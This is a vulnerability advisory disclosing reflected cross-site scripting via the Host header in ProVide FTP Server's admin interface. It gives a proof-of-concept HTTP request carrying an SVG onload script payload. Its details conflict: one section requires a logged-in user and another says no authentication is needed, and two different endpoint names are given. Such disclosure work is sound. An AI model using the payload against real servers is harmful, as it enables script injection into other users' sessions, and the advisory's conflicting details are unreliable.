# Waitedit - Reflected Cross-Site-Scripting via Host Header manipulation

## Summary

The application does not consistently validate client side input, and as a result of this it was identified that the web application was vulnerable to Reflected Cross-Site Scripting.

In the context of this vulnerability, a logged in attacker may execute active content in the context of other logged in users, injecting JavaScript or other active contect in the display name, and sharing a public accessible link.

## VulDB-Like Summary

A vulnerability has been found in the Admin Web Interface of ProVide FTP Server (formerly zFTP) for Windows up to v13.1. It has been declared as problematic. Affected by this vulnerability is an unknown part of the file /ajax/collaborate. The manipulation of the **Host header** with the input value `"/a><svg/onload=alert(1)><a href="` leads to a cross site scripting vulnerability. The CWE definition for the vulnerability is CWE-79. As an impact it is known to affect integrity. An attacker might be able to inject arbitrary html and script code into the web site. This would alter the appearance and would make it possible to initiate further attacks against site visitors.

The weakness was disclosed 04/06/2020 by Alessandro Magnosi (deadc0de) (GitHub Repository). It is possible to read the advisory at github.com. This vulnerability is known as CVE-2020-XXXX. The attack can be launched remotely. The exploitation doesn't need any form of authentication. Technical details of the vulnerability are known, but there is no available exploit.

## Proof-of-Concept

**Sample affected URL:**

* https://provide.ftp.local:8443/dkb4QRBT4hG4EGMu/ajax/waitedit

**Sample request:**

```
POST /n8nTTXWuZgi9gDyy/ajax/waitedit HTTP/1.1
Host: "/a><svg/onload=alert(1)><a href="
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded;charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 115
Origin: https://provide.ftp.local
Connection: close
Referer: https://provide.ftp.local/
Cookie: ProVideSessionID=u1aSUSPhZUEgmuu

url=https%3A%2F%2Fprovide.ftp.local%2Fn8nTTXWuZgi9gDyy%2F4Z93Q76H%2Ftestfiletxt
```

## Remediation

No official fix is available for this issue.

## References

* [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
* [https://www.google.com/intl/en/about/appsecurity/learning/xss/](https://www.google.com/intl/en/about/appsecurity/learning/xss/) 
* [https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) 
